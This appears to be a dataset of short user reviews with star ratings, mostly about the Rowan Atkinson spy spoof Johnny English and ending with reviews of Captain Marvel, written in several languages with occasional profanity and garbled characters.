"One of my favourite films. As a James Bond-fan, this is absolutely fantastic comedy version of the 'real thing'. You can't help but laugh all through out the film. 1/2 star is missing because of John Malkovich. Never been a big fan. But Rowan Atkinson is genius.",4.5
"it is reallyy funny, just another james bond joke i guess.... but it's funny",3
I love this movie it is sooooo FUNNY!!!!,5
i'm a sucker for bean-like movies,5
Summary of movie: Mr. Bean Meets James Bond.,3.5
cool! piety for the sequel...,4
this movie should go die in a hole and never come out again,0.5
"M√É¬°m r√É¬°d Atkinsona, ale v√É¬≠c jako Mr. Beana...;)",3.5
SO FUNNY!!!!!!!!!!!!!!!,4.5
hirarios from start to finish rowan atkinson again delivering a great comic performance if it was anyone else it woulndt of been anywhere near as good natalie imbruglia is so sexy as his counterpart john malkovich great as the evil villain,4
"Some bits are awkward, but generally most amusing. Natalie is attractive enough to restrict herself to mating with members of the human species, not sure what she sees in Johnny. Malkovick channels John Cleese as the Fronch guard, ""I wive ma genitals at yerr Onty...""",3
Best line in any film! The only thing the french should hold is an invasion!,3
He plays this guy so well it's almost pathetic! That's what a good movie needs!,4.5
Rowan Atkinson is hilarious its sad we dont see him land more roles,3
HILARIOUSLY FUNNY! MR BEAN RULES! AND TEDDY TOO!,4.5
I quote this movie SOOO much! Rowan Atkinson is great in this movie!,5
An amazing James Bond spoof. Super funny and Rowan Atkinson does amazing,5
Rowan Atkinson SUCKS!!,0.5
"Heh heh heh....is this movie stupid? Yes, very much. But it gave me the opportunity to see John Malkovich be a French baddie. John Malkovich makes the film.",3
he is a compleet idiot lol! but thats what makes it funny. A verry good movie.,4
This is the best Rowan Atkinson movie you will ever see.,4.5
TELEIO O ROMAN!!!!!!!!!!!!,4
"This is probably the best Rowan Atkinson movie made so far. If you like James Bond or other secret agent movies and are in the mood to see a spoof of them, this movie is worth a rental. There are a couple of VERY funny moments in this film.",3.5
lol.. atkinson's great. but the movie not so much.,2.5
A decent effort. Sadly he can't carry a film on his own.,3
Quite funny but not as good as Mr Bean character,3
Funny not great but funny,3
The worst movie I've seen Rowan Atkinson in to date.,2.5
Could have been better,3
http://cineptimoarte.blogspot.mx/,3
Funny but a little of the same after some point,3
"Haha, this was so funny!",4
atkinson...lucu banget..,3.5
"This James Bond spoof, headed by British comedian Rowan Atkinson, was okay....a fair amount of laughs but not enough to add this film to my collection. Atkinson reminded me a bit of Benny Hill, a more famous English comedian who also doesn't speak much but lets his actions and facial expressions garner his laughs. Both are likable guys. John Malkovich plays a Frechman here and his accent is pretty good. He seems to be always playing strange roles. There really isn't a whole lot to say about this film. Except for a very funny toilet scenes, much of it isn't that memorable. Just a lightweight hour-and-a-half of entertainment.",3
"Just watched this movie on my iPhone. Rowan Atkinson is such a funny man, loved him in this film.",3.5
man if you havent seen this movie yet you should definetly rent it,5
"Ok, yes, I secretly like Rowan Atkinson.",3.5
What a great actor.... Love it,5
"Was a really good comedy, Rowan Atkinson was great in this",5
good but get bored if watch it too many times,3.5
My kids love this movie - adults won't though.,1.5
"oo, t√É¬§√É¬§ on hyv√É¬§, tykk√É¬§√É¬§n t√É¬§st√É¬§ aina vaan!",4
"Atkinson is good at bumbling, but its not compelling enough to carry the movie. Natalie Imbruglia is hot... I'm torn.",2.5
very indie yet plain and kinda predictable,0.5
I couldn't stop laughing!,5
rowan atkinson is hilarious,3
Mr Bean....yeah well it might not be his movie but he plays johnny English. A james bond type of movie. Very funny and entertaining. It has its Mr Beans moments.,3
omg hes so stupid that its kinda funny lol,3.5
Wanted more from one of my favorite comics. The sceen play let him down.,3
"i want to like rowan atkinson, but this movie wasn't that funny.",2
Mr. bean becomes a spy. Hilarious!,4
"And I love Rowan Atkinson, too...",2
A little silly movie but it's a good fun to relax. Fun though ;P,2.5
A funny flim with Rowan Atkinson or as you know him as Mr. Bean.,3
its a pritty good movie especialy the sound effects,4
"Well, this is one of those movies that you either hate or love I think. Because Rowan Atkinson is one of those actors... It is pretty funny and has some hilarious parts and a plot. Its just not ridicolous scenes without a purpose. This really unexperienced spy, Johnny English(Atkinson) somehow manages to become the right man for the job. When the crown jewles are stolen by an evil frenchman played by the fantastic and very talented John Malcovich. So English and his sidekick Bough, who actually outsmarts(but never outwitts) the actual spy at times, head out to save the stolen jewles. Mixed with hilarious carchases and silly mistakes, Mr English somehow manages to save the day. With help from a beautiful ""exotic woman"" that you cant really figure out if she's evil or not. All in all, if you are looking for some easy laughs, this is a pretty funny movie, clearly inspired by Get Smart to some amount.",3
"The best film in my DVD rack, I have watched it over and over again, and still manage to fall off of my seat laughing when he dances to ABBA. Rowan Atkinson is my favourite comedy actor, and the french villain Pascal is hilarious.",5
"A funny enough comedy with Atkinson in a Bean-esque role. The toilet humor went a touch overboard at times, but mostly it's a predictable and chuckle filled ride.",3
Rowan Atkinson. Thinks he's James Bond. Spoof .,5
i dont understand why it was straight to dvd but it because it was hilarious,4.5
Hardy circa 1998 would have loved this!,2
"Oh dear. Sorry, Rowan, but you are funny when you are being funny, rather than bumbling. Ironically, English is an occasionally competent spy waylaid by being clumsy and pompous. This is a competently made film waylaid by being clumsy and basic. Malkovich is excrebale, probably through no fault of his own, Imruglia is hot but badly written, Miller is funny, but one joke, and Atkinson is very watchable, albeit lumbered with a script that relies a little too much on gurning. The fact that Atkinson makes a very convincing spy when not hamming it up is even more disappointing. Ah well.",2
"The British, they just can't get enough Ben Miller...he's like the modern Charlie Chaplan...from bizarro world where everything is opposite, including comedy.",2
Funny Mr. Beans is always funny :),5
Rowan Atkinson ahora parodiando a Bond y las pel√≠culas de agentes secretos un buen reparto para una pel√≠cula nada notable,1.5
"Its nice to see rowan atkinson acting in something other than blackadder or mr.bean- hillarious comedy, love the song by robbie williams too!",4.5
"I like Rowan Atkinson, but this one was really lame. Sorry, no joy with this movie.",2
This was funny! And I love Rowan Atkinson.,3.5
"An unhinged parody of James Bond theatrics, Johnny English finds Mr. Bean himself suiting up as the eponymous super spy for a series of wild and silly adventures. A lowly pencil pusher working for the MI7 agency, Johnny English (Rowan Atkinson) is suddenly promoted to super spy after Agent One is assassinated and every other agent is blown up at his funeral. When billionaire entrepreneur Pascal Sauvage (John Malkovich) sponsors the exhibition of the Crown Jewels and the valuable gems disappear on the opening night, and on the watch of English, the newly designated agent must jump into action to uncover the thief and procure the missing valuables. Tracking the thieves' underground escape route with sidekick Bough (Ben Miller), English locks in on Sauvage despite repeated assurances by boss Pegasus (Tim Pigott-Smith) that the respected entrepreneur has nothing to do with the crime. Could the mysterious Lorna (Natalie Imbruglia), who has an odd habit of turning up at the wrong place at the wrong time, hold the key to helping Johnny? A massive hit overseas, Johnny English held its own at the box office in early April 2003, and was slated for wide release in the U.S. If the spoofing in Johnny English strikes especially close to home, that may be because the film was scripted by Neal Purvis and Robert Wade, who teamed to pen such Bond adventures as Die Another Day and The World is Not Enough. Jason Buchanan, All Movie Guide",4
"I know it's totally corny and silly, but it's a bit of a guilty pleasure for me - I really enjoy watching it.",3.5
"Oh Rowan Atkinson...What happened to you? Such talent wasted on rubbish like this!...The original adverts that the character comes from were quite funny, but who makes a feature film about a character from a credit card advert?",1
"Natalie Imbruglia, Rowan Atkinson both awesome in this wheres the sequal",5
stupid ben miller is a loser,0.5
"Funny, but certainly not deep",4
Rowan Atkinson is always good to watch.,3
"Like Mr Bean, without the funny.",2
Mr. Bean as Bond-like as he'll ever be.,2.5
Lowered the rating because they were dumb enough to make a second one.,1.5
"Stick to Mr. Bean, Mr. Atkinson",0.5
Weird. But hilarious none the less.,3
"Good Bond spoof, and the British funny really works in this picture. Good job Rowan, you made me laugh making an ass of yourself in this.",3.5
Not as funny as I thought it would be...,1.5
HAHAHA! Love this movie!,5
"So much potential, so little humour.",1
"Ganske koselig og relativt underholdende syns jeg. Rowan Atkinson kan √É¬• spille andre roller enn Mr. Bean, selv om denne rollen har visse Mr. Bean-elementer. Uansett, ikke no store greier dette her, men ikke det verste heller. Dro p√É¬• smileb√É¬•ndet et par ganger, ja.",3
A bunch of cheap gags related to being a klutz. Just not my sense of humor.,2
"Rowan Atkinson is hilarious, very much. Just for him, I'm rating it this much",4
Johnny English is a smart film very funny. Rowan Atkinson is very funny and very entertaining. The story is smart when England's only hope is the last man on earth you want to trust the fate of Great Britain too. One mistake made in the film is the Villain's plan to become the king of England and make Britain a giant prison. But of course no King/Queen has the power to do that. But besides the plan to destroy England the film is Great!. I think this is one of Britain's best comedies. Not as a good as The Full Monty or Life of Brain but still up their. Johnny English is a film you can see loads of time. and still find it funny. It's a film for all ages.,4.5
in the vein of Get Smart,4.5
"It's better than the Bean films. Rowan Atkinsons role is great & for once we hear what his real voice sounds like. The musics The best. Great story, action, actors, villans, charaters, & of course commedy.",4
"OK, really. Has some funny parts.",3
"Mr. Bean speaks! As a spoof of the Bond films, it's fairly cute, but you won't have any regrets on your deathbed if you fail to ever rent this one.",1
Oh Mr. Bean... please stop. I just can't take any more.,2
"Atchinson: ""believe me I never ever <insert action> Followed by him doing the action.",1
Rowan Atkinson does it for me.,3.5
"Rowan Atkinson's movies really, really suck.",1
"This isn't a bad Bond spoof and, although not as star-studded as the original Casino Royale, it provides some good moments. The trouble is that, in many ways, the Roger Moore Bond series actually sent Bond up even more, so the joke isn't quite what it could have been and what you have left in places is a rather over-long Rowan Atkinson Barclaycard ad. The trailer promised much more, but unfortunately the trailer was all the best bits.",2.5
"God this film is awful, the star comes from an on form Mr. Bean-esque Atkinson thrown over his head into a spoof of the spy genre.",1
Seriously hilarious.. !!! I enjoyed Rowan in this movie more than his Mr. Bean avtaar. He is brilliant as always.. only this time he has a beautiful accomplice in Natalie Imbruglia..,3
"not a fan of the mr bean series and this was just mr bean but a little bit, not much more, smarter.",2
Rowan Atkinson at his best - classic film,5
It's Mr. Bean! Funny.,2.5
My fragrant French ass it can't!,2.5
i love this guy he is funny.,4
"Funny, but i don't know...",3.5
Le pari de mettre Mr Bean dans un role satirique de James Bond est un rattage,0.5
"This film is Catwoman bad. Imbruglia is poor, Atkinson is limp and the jokes are cunting awful. Malkovich's accent is diabolical too.",0.5
"i love this movie! one of the funniest films ive ever seen! Rowan is hilarious! much better in this than Mr. Bean! thye stuff that he does is just so random! lol the Archbishop, funeral, and the ring confusion are my favorites! I first saw this when it came out and ive watched it a bunch of times! it never gets old lol",4
its quite good hes still looks so weird though but i havent finished it,4.5
I couldn't watch the whole movie. Oh how I long for the good 'ole Mr. Bean days.,0.5
awesome!!!!!!!!!!!!!!,4.5
hmmm i expectd a bit more.....nice movie bt not tat funny....,3
"Nice to see Rowan Atkinson in a movie that he can actually speak in. Somewhat believable story but Atkinson was the whole movie, who cares about the story or anything else because he's funny as hell.",3.5
"dumb as heck, but somewhat watchable",2
A funny movie but not as much as his tv shows.,4
My friend thought it was good...he was wrong.,1
"cheesey, light hearted.. great to have on in the back ground",3
This movie was real gud,4
Kind of lame. Not many laughs unfortunately.,2
"Rowan Atkinson is only a little funny, and this movie is only a little fun.",2
"What can I say, I love Mr. Bean.",3
"I was told this was hilarious. Apparently, I missed the funny part.",0.5
Johney English is A great comedy,4
The best comedy movie ever!,5
haha this movie cracked me up Rowan Atkinson is excellent actor he plays his parts well LOL bless him,5
Iv sat where he sat in the sushi bar... thats about all i have to say,1
I like Rowan Atkinson,3
silly and funny and great!! apart from the pooh!! yucky!!,3.5
the funniest movie ive seen,5
"Lowbrow with telegraphed punchlines, Atkinson's non-Bean stab at the American market had lots of opportunity but little delivery. Best, genuinely funny bit has him attending a cocktail party with a paralyzed arm. Watch 3 episodes of 'Blackadder' or 'The Thin Blue Line' instead to better spend your time and get 50 times more laughs.",2
SOOOO Disappointing. I love Mr. Bean!,1
"very funny, rowan atkinson is awesome",3.5
very funny film about a clumsy secret agent,3.5
"I really enjoyed this. It was a funny family friendly film, the kind you don't find too often these days. I really just laughed and enjoyed spending time with my friends with this movie. Definitely one for all occasions.",3
"I must admit that I laughed at this tame send-up of James Bond, thanks to Rowan Atkinson's dead-pans and physical comedy. But I couldn't help thinking that the timing on many of the jokes was off. Johnny and Bough reminded me of Blackadder & Baldrick.",3
great! very entertaining. Rowan Atkinson did a very good job=),4
Mr. Bean is funny in half hour spurts. More than that is just a recipe for disaster.,1.5
This guy is such a nut!,3.5
"Quite Funny & I Was Surprised At How Well Atkinson Did In This Role Compared With His Other Predictable Cliche, Poorly Type-Cast Performances. I Laughed So It Did The Job For Me. Some Parts I Could See Wouldn't Rub Off On Everyone..But Oh Well. Not For Everyone.",3.5
Totallyy goood he spanked the James bond with his might ! It's a different kind of watching watching rowan every time,3.5
"I always think of this when I hear ""Does Your Mother Know"" by ABBA. Also like the song by Robbie Williams used in the opening credits.",4.5
You will like it if you have seen spy movies.,3
I was SO EXCITED to see this. I saw it on opening day.,2
"James Bond satires and spoofs have been done many times. What makes this from falling flat on its face is the witty slapstick of Rowan with the excellent British and American actors for the roles. It's on the editable side of cheese, but it is quite enjoyable. In fact, it's very funny, but sometimes predictable.",3
I love mr bean holiday i think he is brilliant he is realy funny i think he is hillarious all my family like mr bean holiday we have ll his dvd and videos wae him.,5
could have been better,3.5
My fav actor/comedian,3.5
"brilliant, one of his better films",4.5
"Excellent ""stupid"" movie.",3
This is not as funny as it should have been,3
good if you like rowan atkinson =),4
Hilarious (if occasionally patchy) 007 spoof.,4.5
looked funny... wasn't,0.5
Yes! absolutely funny!,5
"Mr.Been plays it,He's the strongest comedian.",5
Rowan Atkinson is not too bad... But this movie is more like Bean on steroids...,3
"Stupid movie but it did have one good line. ""The only thing the French can host is an invasion.""",1
Rowan Atkinson is such a talent. Great fun.,4
Rowan Atkinson is hilarious,2
mrbean's Holiday and bean and Johnny English and Rat Race is the funneys movie ever.,5
"Silliness as only Atkinson can - I liked this. It's not great, no, but it's amusing in places and I like almost all of the major characters. Take it with a grain of salt. :)",3.5
sorry i thought this one was crap i prefer mr bean,2
"some elements of bean, has its moments.",3
hilarious and stupid.,3.5
Not as good as it could be. Should be much better.,3
Not bad comedy. It had good spoof of james bond providing great action. Worth watching.,3
"You have to love Rowan, he's very funny. I have enjoyed pretty much everything he's done, and this one is no exception. If you like Mr. Bean and if you like Austin Powers, then you will certainly like Johnny English. It's also interesting to note that the writers of this film have also worked on several 007 films, including Casino Royale.",3
"I laughed so hard the first time i saw this movie (and the 2nd, 3rd, 4th, 5th.......)!!!! It's been one of my favs for 5 years now!!! : )",4.5
The most dissapointing film of recent memory.,1.5
Better than I thought it would be.,3.5
Rowan Atkinson sum hemmiligur agentur. Og urslitid? Tann stuttligasti filmurin fra 2003,4
great movie. very funny!,3.5
"While it lives up to the very definition of 'hit and miss', the parts that hit are very funny.",3
"ROWAN ATKINSON!!! That defines this movie. Extremely funny and very absorbing, this movie just pulls you into the screen while you're watching it. And not to mention again that Rowan Atkinson plays the part of the goofy Johnny English perfectly. That said, this movie is a good watch.",3.5
if you don't like Mr. Bean don't see it,3
"Not quite The Pink Panther originals, but still humorous.",4
Rowan Atkinson rocks.....,4.5
very entertaining! NOTE: I OWN THIS ON DVD,3.5
"always been one of my favourite comedy actors, this was my favourite film when i was younger, i used to love it, and ... still do!",4.5
I laughed my ass off in the cinema,4
i cant decide which is better.bean or johnny?anyway they all hilarous.,4.5
"Ok, but nothing more. Ben Miller outdoes Rowan Atkinson on the funny side.",2.5
"Oh yes! now we talking, unfortunatly not a film i haven't see, i actually own it but still. Really funny !!",4.5
"The plot is a little weak, but its so hilarious I didn't care. I laughed so hard.",4
"Seriously, Rowan Atkinson never fails in comedic movies! He's so funny and in this, is so stupid! But I loved it, and I think Boff was an excellent sidekick!",3.5
"v√É¬§ldigt rolig, men inte st√É¬∂rsta fanet av s√É¬•na h√É¬§r filmer, rollen passar v√É¬•r k√É¬§ra mr bean perfekt iaf",3
rocks ma sox like i do lol,4
everytime anyone talks about comedy films in pubs or anywere this is one of the first films mentioned some classic comedic moments in this film,5
Rowan athkinson is the man. this movie is extremely funny in the goofy/slapstick sort of way. a definite watch,5
"not as funny as i expected, but it was still good, a nice family movie",3
"THE BEAN BOND. I completely love ""Boff"" hahaha . There are countless good parts that are humorous in this movie and ofcourse I enjoyed it ! :) And who doesn't love a french villian? bwuahaha. ""Shall I try it on?. Yes?. No?. Maybe?""",4
Get smart was better,3
Get smart was better,3
"Veeeery laughful flick. Rowan Atkinson rules, playing dumbs.",4
I love Rowan Atkinson! He made me laugh so many times in this movie!,3.5
I liked this. Rowan Atkinson and John Malkovich? Made to be funny. Very good.,4
"I love this film, it's hysterical! The title character is a man very much like me - in fact, I think it IS me!",5
Rowan Atkinson is actually a funny guy. I just don't like the character he so often does.,0.5
some laugh-out-loud moments,2.5
I like Mr.Bean. But this? The story is really bad with lame jokes. Some flashes made me smile but over all this is not funnt. And how did John Malkovich end up in this movie?,1.5
Not as Funny as Mr. Bean...but cool ...,4
I really hate Rowan Atkinson...,1.5
great film boaring at parts but rest really gd.,4.5
"I like Rowan Atkinson, nut I'm not too thrilled about this business as usual comedy.",2
rowans aston is in this! :D,5
A funny comedy with Mr. Bean.,3
one da funniest movies ever xxx,5
Rowan Atkinson a great actor!Very Funny!,4.5
"Oh, it's a very funny movie!",3.5
One of the funnies parodies I've seen! Definitely worth a watch if you want a laugh!,3.5
"Fun, better than mr Been",4
"Rowan is a throwback physical comedian. Laurel and Hardy, three stooges, Jerry Lewis. Yeah you get the idea. Lame physical comedy, it can still make a person chuckle.",2.5
Awesome and extremely funny! :D,5
"Vous n'aimez pas Mr Bean ? Vous n'aimerez sans doute pas Johnny English non plus, qui fait pourtant l'effort de ne pas rester cantonne au comique de situation typique du personnage. Vous venerez Bean ? La aussi, vous serez un peu decu par cette comedie plus classique et pas toujours tres fine...",2
The Single Best Spy/Comedy (No Austin Powers) Movie EVER! A cinematic masterpiece!,5
"Seen it, its funny but old, maybe a new comedy agent film should comne in? GET SMART! wahoo",4
As a fan of Mr. Bean I couldn't help but like this movie. No it's not smart and it doesn't break any ground but it's entertaining. I laughed pretty hard through and through. It's not a great movie but really it has some great moments.,3
go back to being mr. bean,2
Natalie Imbruglia looked good.,2.5
can't help but need to turn it off from the TV just after watching it for 10 mins......,0.5
"Rowan Atkinson doing what he does best, this makes for a rather entertaining show.",3.5
I am a huge Mr. Bean fan and I loved this movie.,5
"Could have been more funny, but for some light entertainment, this movie is ok. Without Teddy and his littel green car, Mr. Bean lacks some personality.",3
travis and i had fun lol,0.5
I'll always have a soft spot for Rowan.,2
My sister enjoyed this...,1
It's Mr. Bean! How could anyone resist? It is a pretty funny film and although there are countless spy parodies out there...not many have Bean.,3
not the greatest atkinson film but not terrible.,3
Poor Malkovich and Rowan. This is stinker.,1.5
i don't remember it very well but it was pretty good,4
"It's sad that Atkinson can't get a good film under hisbelt adn be appreciated for his comic talents. His physical versatility is amazing and his comic timing is impeccable, but he can also be cerebral and that's where his true genius lies. Black Adder is his best work, and so far his American films have been throwaways. So much potential here, maybe too much for his script-writers and producers to achieve. Just one decent story would make him a big hit here.",1.5
One of a very small list of movies that I ejected from the DVD player before it finished.,0.5
"The plot of this film takes a backseat to the comedy, which is bad in theory but only minimally so in practise. Atkinson is such a talented comedian that he could probably make even the most inane piece of material work, which he does here; Malkovich is hideously miscast as a Frenchman, although he displays a surprising amount of menace giving the nature of the film (and, indeed, his character.) The film doesn't offer much new beyond any standard farce, but the nature of farce doesn't demand it: it's a good laugh, and we can't ask for much more than that.",3
this is a funny film rowan atkinson funny as ever hes great,5
"Awesome very funny.Rowan Atkinson was very funny only a twerp,a big twerp!!!!",5
"I was truly supprised at how good this movie is. When you've been exposed to Mr Bean all of your life you tend to expect Rowan Atkinson to be unable to come up with another character worth watching (other than Blackadder of course). Extremely funny when you're in the mood for ""in-your-face"" humour.",3.5
LOLZ Rowan Aktinson is fab. Really funny!,3.5
Funny British Comedy,4
"It was pretty funny. Rowan Atkinson has some pretty funny scenes in it. My favorite being the one where he ""Fights"" the thief.",3
"Really funny, although it is kind of stupid",3.5
very dumb but i really enjoyed watching it,4.5
this is so funny! They should make another one.,4.5
"Some actors should be banned from doing anything but the characters they are known for. So, Rowan, please stick to Mr Bean or Blackadder. Please.",1
That dude that plays Mr. Bean has never had a funny movie in his life... Rat Race was decent.,0.5
"Glad to have seen this movie when I had the chance. If I didn't, I wouldn't have thought to even see it!",5
Rowan Atkinson was brill!,4.5
MR.BEAN AS AN AGENT FUCK YEAH,4.5
"I always enjoy watching Rowan, I wish he did more movies. Very fun, very silly. But still suspenseful and interesting.",4
"The Spy Who Buggered Things Up, just watch and enjoy Rowan Atkinson, one of the funniest actors in the UK these days.",4.5
"its great. Rowan Atkinson finally gets another opportunity to actually use his timing and wit rather than just look funny in Mr.Bean . this is the role i best know him and love him for, after all of the black adder series (which everyone should watch a little from each series) maybe the movie itself has alot of problems, but it has the feel of the pink panther meets James Bond. Really, kudos for using Atkinson.",3.5
this movie is so funny i own it on dvd!!!!!!!!!!,5
How can you not like a movie that has Rowan Atkinson?,3
"Rowan Atkinson, John Malkovich, and...Natalie Imbruglia? Well...I mean, they can't really say they expected it to be a masterpiece.",0.5
I had lots of fun while watching this movie,5
"Fairly good, but not a classic.",3
Sometimes you just have to lower all expectations to completely enjoy a dumbed-down spoof.,3
Cute the first time you see it but it is corny and come on John Malkovich... whats with the terrible accent..????,2
Irresistable British humor gone wrong. It was definitely one of his best performances. Frustratingly funny and rediculously serious british/american mix. Fun.,3.5
"Funny, I love Rowan!",3
Im a Rowan Atkinson fan. Mr. Bean is hilarious. This is pretty much just another Mr. Bean movie. HILARIOUS.,3.5

lol kinda like get smart the french guy says 'merde'!!!! lololololol,4.5
"Bean is always funny to me, and Johnny English was a well-made spy spoof film for my money. Natalie Imbruglia was pleasant to watch, and her acting wasn't half-bad. What really perturbed me was Malkovich's Pascal Sauvage-- that quasi-French-slash-German (?) accent was horrible, and he's usually good on foreign dialects (""Pay dat man heees maahn-ey!) But I'll forgive him because it's a comedy and it made for some unintentional laughs.",3.5
I used to absolutly love this movie and watched it every day and it's still funny.,3.5
funny funny funny funny,5
That guy isn't funny... he's stupid.,0.5
I think it was the funniest film i've ever seen,5
"Quite frankly, if I must say myself, this movie was hilarious.",4
It was really entertaining ... but not that kind of comedy on which u can laugh again after seeing it once,4
its ok was funny at sophies party :),4.5
It's stupid and completely unrealistic. But it's dang funny.,4
"cmon, he IS mr bean... and he should NOT talk!",1.5
"There are some hilarious parts, but I think it's over-rated.",3
funny and wow hilarious ever,5
"Oh, Rowan Atkinson, how could you fail me so?",1
"An amazing movie, very funny and entertaining. Especially when Rowan tries to reveal Pascal's evil plans at his coronation :D",5
Hyi helvetti. YKSI minut naurahtamaan saanut vitsi koko leffan aikana...,0.5
Mr. Bean is so silly I can't help but giggle!,2.5
"dumb agent, dumb movie",0.5
I thought this would be funny - but most of the time it was just booooring...,2
lol this is funny nd stupid lol,2
Rowan Atkinsons is just hilarious.,3.5
It'll soon be a classic. Brilliant 007 spoof. With Rowan Atkinson. Very funny.,4.5
"su mejor personaje sigue siendo el cura de cuatro bodas y un funeral, definitivamente",2
oh please I don't know why people like this movie,1
"rowan atkinson is very funny. he is the funniest guy without speaking, like in mr. bean.",3.5
Rowan Atkinson people!,5
"Mr. Bean is always funny, but it all felt like it had been done before.",3
"Aside from some corny jokes, a pretty entertaining comedy.",3.5
Funniest movie ever...,5
"Most predictable movie ever made, not funny, not entertaining. I would rather watch the worst Mr. Bean episode for 90 minutes than be subjected to this filth ever again.",0.5
rowan is like... wow.. cant put it into words; but it's awesome!,4
"i love this movie, so good that i already watched like 5o times and still love it u would really enjoy it",5
I saw a few years ago in Iran .,3
Lol. LOL. A movie with Rowan Atkinson. This is a family comedy movie. Fun to watch.,3.5
"typical mr. bean , a few chuckles, but entertaining. it was cool seeing him try to play a serious (spoof) role.",2
haha i love rowan atkinson,4.5
"I dun like it when bean talks, i prefer him quite..but its ok",3
"Rowan is always entertaining! He does great in this movie, as compared with others in these few years. Hope that he can do a better one in the neat future.",4
One of the funnies parodies I've seen! Definitely worth a watch if you want a laugh!,3.5
This will make you laugh. If you enjoy spy and action movies you will love this one! Rowan does a get job. Sit back and laugh.,3.5
this movies hilarious!!,5
Why wasn't this funnier!?!?!,1.5
So hilarious the whole way through!,4.5
"Ha ha, whatta dummy..I love Atkinson",3
"As gay as English people are, this is surprisingly funny",4
"It's ridiculously funny! Also, it's nice to Hear Rowan Atkinston voice.",4
"Mal wieder seichte Abendunterhaltung, bei der man nicht nachdenken muss...Mehr aber auch leider nicht-Mr. Bean bleibt eben Mr. Bean. ;)",2.5
I hate Mr. Bean but loved this movie and even the Mr. Bean one... Do I suck?,3.5
i swear i never freakin laughed so hard,5
Rowan Atkinson is a comedy God. This film proves that he's more than just Mr. Bean.,4
Way better than misogynists want you to think.,5
"Why would anyone want to watch a movie about an overpowered protagonist and the archenemy isn't even stronger, he just tells her to 'cOntRoL hEr pOwErS'.",1
I know many people dislike this movie but I found it genuinely entertaining and endearing. Better than the average super hero movie.,3.5
"Perfect movie, Brie Was amazing.",5
"This is probably the 2nd worst movie I have ever seen in my life, and I have seen some doozies. The story didn't accelerate the Infinity Saga at all. It felt like a spin off of Guardians of the Galaxy... Ronan is the 3rd most boring Villian in the MCU only behind Aldrich Killian and Crossbones",0.5
"Not a great movie, but also not terrible. Had a few entertaining ideas and good scenes. Overall, not a very impressive superhero movie. Glad I didn't see it in the theaters. How this movie made $400 million domestic I will never understand.",2.5
realy uderrated movie,4
"Nunca entender√© porque recaudo m√°s de 1,000 millones de d√≥lares",1
"Another fun movie from Marvel, and a good translation of the character to the MCU, ditching some of the more cringe elements of the character‚Äôs history.",5
"Senaryosu, alt metinleri, twisti ve g√∂rsel efektleriyle √ßok g√ºzel bir film olmu≈ü. Tam bir s√ºper kahraman filmi olmu≈ü. Antman pe≈üine izleyince fark bariz belli oluyor. 8/10",4
This movie was really good.It plays the origin story of Captain Marvel really well.Brie Larson and Samuel L Jackson shined in they're performances.The action's scenes could've been better but overall this movie was really good,3.5
"Great movie, good storyline, humour. A must see for marvel fans!",5
"""Captain Marvel"" isn't groundbreaking or a particularly quality piece of cinema, but it's like McDonalds - it's poorly made by heller entertaining - or in the burger's case - delicious.",2
"The moderate, well-paced storytelling has always stood out to me in this movie. Between Danvers reclaiming who she truly is and the story of the Scrolls, Captain Marvel has always left me more than satisfied.",4.5
"I love how this film introduces an extremely powerful character, something that is very difficult to maintain a certain balance, but it worked very well.",5
This movie is often looked down on by fans but it surely does not deserve any of that hate. There were some really good moments and I thought Brie Larson did a good job playing captain marvel! I just wish there was better plot elements that should've been added in to the story. I'd give it a decent 6/10 to be fair.,3
Great marvel movie. Better than most of phase 4,4.5
"I enjoyed it, I don't get the hate for this movie",4
Great movie with logically ideas,4.5
"Only a handful of Marvel movies turn out boring. IMO this is one of them. A movie like this relies on the charisma of its lead. Unfortunately, that was sorely lacking in this film, which is odd since Brie seems likeable in the interviews I've seen.",1.5
one of my favorite marvel movies! so awesome and fun and hilarious with some emotional moments and mind evolving moments. maybe ur the brainwashed one,5
It was so cringe and felt like they were on a $100 budget,1
"Great origin story. Pacing was good, and if you don't expect it to be as grand as Avengers: Infinity War, well you'll leave the theater plenty satisfied with Captain Marvel. Brilliant acting, perfectly timed funny moments, good buddy relationship (Marvel and Fury), fab supporting cast, and enough of a story to have some measure of consistency with the Carol Danvers canon, it's enough for movie buffs, casual fans, though I'm not sure about the hardcore comic fans. Stay for the mid and end credits. Now I've become a fan of Brie Larson after this movie. She is cute, gorgeous and, quite obviously, a terrific actress (an Academy Award winner already st such a young age).",4
Another good movie of the MCU. Loved seeing new lore for Fury and the Kree. I recommend it.,4
"I loved this movie since the first watch, full of action, adventure and full of fun especially seeing Captain Marvel's powers. Also one of the most beautiful visuals I've seen in the MCU. Great and amazing movie!",5
Terrible. Only reason I'm not giving this a half star is cause I like Nick Fury. So much boring and bad that couldn't keep me interested,1
"it just was overall bad writing and there was no overall meaninful message unless the message is ""you dont have to work for somthing becuase your all ready perfect""",0.5
I so excited for The Marvels cause was amazing.,5
"Brie plays an intelligent and believable character along with Samual Jackson, Jude Law and Annette Benning. Well made and fun to watch. Recommend.",5
One of the more unique superhero origin stories and a great soundtrack to boot. Brie Larson and Samuel Jackson were great together - though have to admit Goose stole the show the whole time. The running gag about Fury's eye being in danger was a hilarious use of this movie's semi-prequel status.,5
"I have a few nitpicks here and there, but overall one of the better Marvel films. It's very interesting that this has a 45% audience rating, yet made over $1 billion. Can you say ""review bomb""?",5
Underrated mcu movie,3.5
Eh it's not really good,2.5
Muito bom o filme melhor da fase 3 da marvel muito bom demais muito bom demais mesmo incr√≠vel vou dar 5 estrelas pq ela e uma heroina incr√≠vel demais,5
This movie is great! There is something just so different about this film that makes it great. This is the second movie to watch by timeline order and this film overall feels like a film from a different year. Great movie!,4
Excellent marvel film with great characters and story. Samuel L Jackson and Brie Larson were terrific.,4.5
"This movie isn't too bad. I know a lot of people hate this film, but I don't really mind it to be honest. I really enjoyed Samuel L. Jackson and Ben Mendelsohn in this one.",3.5
"Captain Marvel introduces a powerful new hero to the MCU, but it suffers from a weak plot that may not fully engage all audiences.",2.5
"Capitan Marvel is not the best of superheroes, the character lacks depth.",2.5
If I could give this 0 stars I would.,0.5
Great 90's feminist nostalgia,5
yall mad she's stronger than your fave LMAO,3
"Most of the people that are critiquing the people giving criticism are saying that we're sexist apparently. To quote a youtube title I saw recently, ""The audience doesn't hate strong women, it just hates bad writing"". Of which is plentiful here. The fact that Carol here just seems like an arrogant prick (which is only proven further when she says she can take Thanos in endgame without even knowing who the hell Thanos was) just makes you hate her. It certainly doesn't make you want to root for her. In honesty, Fury was fine, the lesbian airforce pilot was fine (which proves again that strong females aren't the problem) but the fact that there's a main character you don't like just brings the movie down.",1.5
